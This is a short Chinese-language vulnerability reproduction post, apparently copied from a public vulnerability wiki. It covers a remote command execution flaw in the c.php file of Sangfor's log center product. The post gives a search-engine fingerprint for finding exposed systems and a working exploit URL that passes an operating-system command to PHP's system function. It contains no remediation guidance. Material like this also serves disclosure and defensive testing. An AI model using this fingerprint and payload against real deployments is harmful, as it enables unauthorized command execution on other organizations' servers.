---
title: "深信服 日志中心 c.php 远程命令执行漏洞"
date: 2026-10-16 09:11:07
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "深信服"
tags:
  - "深信服"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

深信服 日志中心 c.php  远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行

## 漏洞影响

```
深信服 日志中心
```

## 网络测绘

```
body="isHighPerformance : !!SFIsHighPerformance,"
```

## 漏洞复现

登录页面如下



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202091915868.png)



访问漏洞Url



```plain
/tool/log/c.php?strip_slashes=system&host=ipconfig
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202091915736.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
